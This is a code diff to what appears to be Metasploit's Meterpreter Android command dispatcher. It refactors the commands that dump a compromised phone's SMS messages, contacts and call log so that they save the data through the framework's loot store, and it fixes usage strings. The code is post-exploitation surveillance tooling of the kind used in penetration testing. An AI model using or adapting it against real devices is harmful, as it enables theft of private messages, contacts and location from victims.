@@ -1,4 +1,5 @@
 # -*- coding: binary -*-
+require 'msf/core'
 require 'rex/post/meterpreter'
 
 module Rex
@@ -12,8 +13,8 @@ module Ui
 ###
 
 class Console::CommandDispatcher::Android
-
   include Console::CommandDispatcher
+  include Msf::Auxiliary::Report
 
   def initialize(shell)
     super
@@ -22,7 +23,7 @@ class Console::CommandDispatcher::Android
   #
   # List of supported commands.
   #
- def commands
+  def commands
     all = {
       'dump_sms'          => 'Get sms messages',
       'dump_contacts'     => 'Get contacts list',
@@ -59,7 +60,7 @@ class Console::CommandDispatcher::Android
     device_shutdown_opts.parse(args) { | opt, idx, val |
       case opt
       when '-h'
-        print_line('Usage: device_shutdown [options]\n')
+        print_line('Usage: device_shutdown [options]')
         print_line('Shutdown device.')
         print_line(device_shutdown_opts.usage)
         return
@@ -88,7 +89,7 @@ class Console::CommandDispatcher::Android
     dump_sms_opts.parse(args) { | opt, idx, val |
       case opt
       when '-h'
-        print_line('Usage: dump_sms [options]\n')
+        print_line('Usage: dump_sms [options]')
         print_line('Get sms messages.')
         print_line(dump_sms_opts.usage)
         return
@@ -105,58 +106,55 @@ class Console::CommandDispatcher::Android
       begin
         info = client.sys.config.sysinfo
 
-        ::File.open(path, 'wb') do |fd|
+        data = String::new
+        data << "\n=====================\n"
+        data << "[+] Sms messages dump\n"
+        data << "=====================\n\n"
 
-          fd.write("\n=====================\n")
-          fd.write("[+] Sms messages dump\n")
-          fd.write("=====================\n\n")
+        time = Time.new
+        data << "Date: #{time.inspect}\n"
+        data << "OS: #{info['OS']}\n"
+        data << "Remote IP: #{client.sock.peerhost}\n"
+        data << "Remote Port: #{client.sock.peerport}\n\n"
 
-          time = Time.new
-          fd.write("Date: #{time.inspect}\n")
-          fd.write("OS: #{info['OS']}\n")
-          fd.write("Remote IP: #{client.sock.peerhost}\n")
-          fd.write("Remote Port: #{client.sock.peerport}\n\n")
+        smsList.each_with_index { |a, index|
 
-          smsList.each_with_index { |a, index|
+          data << "##{(index.to_i + 1).to_s()}\n"
 
-            fd.write("##{(index.to_i + 1).to_s()}\n")
+          type = 'Unknown'
+          if a['type'] == '1'
+            type = 'Incoming'
+          elsif a['type'] == '2'
+            type = 'Outgoing'
+          end
 
-            type = 'Unknown'
-            if a['type'] == '1'
-              type = 'Incoming'
-            elsif a['type'] == '2'
-              type = 'Outgoing'
-            end
+          status = 'Unknown'
+          if a['status'] == '-1'
+            status = 'NOT_RECEIVED'
+          elsif a['status'] == '1'
+            status = 'SME_UNABLE_TO_CONFIRM'
+          elsif a['status'] == '0'
+            status = 'SUCCESS'
+          elsif a['status'] == '64'
+            status = 'MASK_PERMANENT_ERROR'
+          elsif a['status'] == '32'
+            status = 'MASK_TEMPORARY_ERROR'
+          elsif a['status'] == '2'
+            status = 'SMS_REPLACED_BY_SC'
+          end
 
-            status = 'Unknown'
-            if a['status'] == '-1'
-              status = 'NOT_RECEIVED'
-            elsif a['status'] == '1'
-              status = 'SME_UNABLE_TO_CONFIRM'
-            elsif a['status'] == '0'
-              status = 'SUCCESS'
-            elsif a['status'] == '64'
-              status = 'MASK_PERMANENT_ERROR'
-            elsif a['status'] == '32'
-              status = 'MASK_TEMPORARY_ERROR'
-            elsif a['status'] == '2'
-              status = 'SMS_REPLACED_BY_SC'
-            end
+          data << "Type\t: #{type}\n"
 
-            fd.write("Type\t: #{type}\n")
+          time = a['date'].to_i / 1000
+          time = Time.at(time)
 
-            time = a['date'].to_i / 1000
-            time = Time.at(time)
+          data << "Date\t: #{time.strftime('%Y-%m-%d %H:%M:%S')}\n"
+          data << "Address\t: #{a['address']}\n"
+          data << "Status\t: #{status}\n"
+          data << "Message\t: #{a['body']}\n\n"
+        }
 
-            fd.write("Date\t: #{time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-            fd.write("Address\t: #{a['address']}\n")
-            fd.write("Status\t: #{status}\n")
-            fd.write("Message\t: #{a['body']}\n\n")
-          }
-        end
-
-        path = ::File.expand_path(path)
-
+        path = store_loot("android.sms", "text/plain", client.sock.peerhost, data, "sms.txt", "Android SMS Dump")
         print_status("Sms #{smsList.count == 1? 'message': 'messages'} saved to: #{path}")
         Rex::Compat.open_file(path)
 
@@ -185,7 +183,7 @@ class Console::CommandDispatcher::Android
     dump_contacts_opts.parse(args) { | opt, idx, val |
       case opt
       when '-h'
-        print_line('Usage: dump_contacts [options]\n')
+        print_line('Usage: dump_contacts [options]')
         print_line('Get contacts list.')
         print_line(dump_contacts_opts.usage)
         return
@@ -202,40 +200,38 @@ class Console::CommandDispatcher::Android
       begin
         info = client.sys.config.sysinfo
 
-        ::File.open(path, 'wb') do |fd|
+        data = String::new
+        data << "\n======================\n"
+        data << "[+] Contacts list dump\n"
+        data << "======================\n\n"
 
-          fd.write("\n======================\n")
-          fd.write("[+] Contacts list dump\n")
-          fd.write("======================\n\n")
+        time = Time.new
+        data << "Date: #{time.inspect}\n"
+        data << "OS: #{info['OS']}\n"
+        data << "Remote IP: #{client.sock.peerhost}\n"
+        data << "Remote Port: #{client.sock.peerport}\n\n"
 
-          time = Time.new
-          fd.write("Date: #{time.inspect}\n")
-          fd.write("OS: #{info['OS']}\n")
-          fd.write("Remote IP: #{client.sock.peerhost}\n")
-          fd.write("Remote Port: #{client.sock.peerport}\n\n")
+        contactList.each_with_index { |c, index|
 
-          contactList.each_with_index { |c, index|
+          data << "##{(index.to_i + 1).to_s()}\n"
+          data << "Name\t: #{c['name']}\n"
 
-            fd.write("##{(index.to_i + 1).to_s()}\n")
-            fd.write("Name\t: #{c['name']}\n")
+          if c['number'].count > 0
+            (c['number']).each { |n|
+              data << "Number\t: #{n}\n"
+            }
+          end
 
-            if c['number'].count > 0
-              (c['number']).each { |n|
-                fd.write("Number\t: #{n}\n")
-              }
-            end
+          if c['email'].count > 0
+            (c['email']).each { |n|
+              data << "Email\t: #{n}\n"
+            }
+          end
 
-            if c['email'].count > 0
-              (c['email']).each { |n|
-                fd.write("Email\t: #{n}\n")
-              }
-            end
-
-            fd.write("\n")
-          }
-        end
-
-        path = ::File.expand_path(path)
+          data << "\n"
+        }
+  
+        path = store_loot("android.contacts", "text/plain", client.sock.peerhost, data, "contacts.txt", "Android Contacts Dump")
         print_status("Contacts list saved to: #{path}")
         Rex::Compat.open_file(path)
 
@@ -263,7 +259,7 @@ class Console::CommandDispatcher::Android
     geolocate_opts.parse(args) { | opt, idx, val |
       case opt
       when '-h'
-        print_line('Usage: geolocate [options]\n')
+        print_line('Usage: geolocate [options]')
         print_line('Get current location using geolocation.')
         print_line(geolocate_opts.usage)
         return
@@ -274,7 +270,7 @@ class Console::CommandDispatcher::Android
 
     geo = client.android.geolocate
 
-    print_status('Current Location:\n')
+    print_status('Current Location:')
     print_line("\tLatitude  : #{geo[0]['lat']}")
     print_line("\tLongitude : #{geo[0]['long']}\n")
     print_line("To get the address: https://maps.googleapis.com/maps/api/geocode/json?latlng=#{geo[0]['lat']},#{geo[0]['long']}&sensor=true\n")
@@ -302,7 +298,7 @@ class Console::CommandDispatcher::Android
     dump_calllog_opts.parse(args) { | opt, idx, val |
       case opt
       when '-h'
-        print_line('Usage: dump_calllog [options]\n')
+        print_line('Usage: dump_calllog [options]')
         print_line('Get call log.')
         print_line(dump_calllog_opts.usage)
         return
@@ -318,32 +314,30 @@ class Console::CommandDispatcher::Android
       begin
         info = client.sys.config.sysinfo
 
-        ::File.open(path, 'wb') do |fd|
+        data = String::new
+        data << "\n=================\n"
+        data << "[+] Call log dump\n"
+        data << "=================\n\n"
 
-          fd.write("\n=================\n")
-          fd.write("[+] Call log dump\n")
-          fd.write("=================\n\n")
+        time = Time.new
+        data << "Date: #{time.inspect}\n"
+        data << "OS: #{info['OS']}\n"
+        data << "Remote IP: #{client.sock.peerhost}\n"
+        data << "Remote Port: #{client.sock.peerport}\n\n"
 
-          time = Time.new
-          fd.write("Date: #{time.inspect}\n")
-          fd.write("OS: #{info['OS']}\n")
-          fd.write("Remote IP: #{client.sock.peerhost}\n")
-          fd.write("Remote Port: #{client.sock.peerport}\n\n")
+        log.each_with_index { |a, index|
 
-          log.each_with_index { |a, index|
+          data << "##{(index.to_i + 1).to_s()}\n"
 
-            fd.write("##{(index.to_i + 1).to_s()}\n")
+          data << "Number\t: #{a['number']}\n"
+          data << "Name\t: #{a['name']}\n"
+          data << "Date\t: #{a['date']}\n"
+          data << "Type\t: #{a['type']}\n"
+          data << "Duration: #{a['duration']}\n\n"
+        }
 
-            fd.write("Number\t: #{a['number']}\n")
-            fd.write("Name\t: #{a['name']}\n")
-            fd.write("Date\t: #{a['date']}\n")
-            fd.write("Type\t: #{a['type']}\n")
-            fd.write("Duration: #{a['duration']}\n\n")
-          }
-        end
-
-        path = ::File.expand_path(path)
-        print_status("Call log saved to: #{path}")
+        path = store_loot("android.calllog", "text/plain", client.sock.peerhost, data, "call-log.txt", "Android Call Log Dump")
+        print_status("Call log saved to #{path}")
         Rex::Compat.open_file(path)
 
         return true
@@ -367,7 +361,7 @@ class Console::CommandDispatcher::Android
     check_root_opts.parse(args) { | opt, idx, val |
       case opt
       when '-h'
-        print_line('Usage: check_root [options]\n')
+        print_line('Usage: check_root [options]')
         print_line('Check if device is rooted.')
         print_line(check_root_opts.usage)
         return
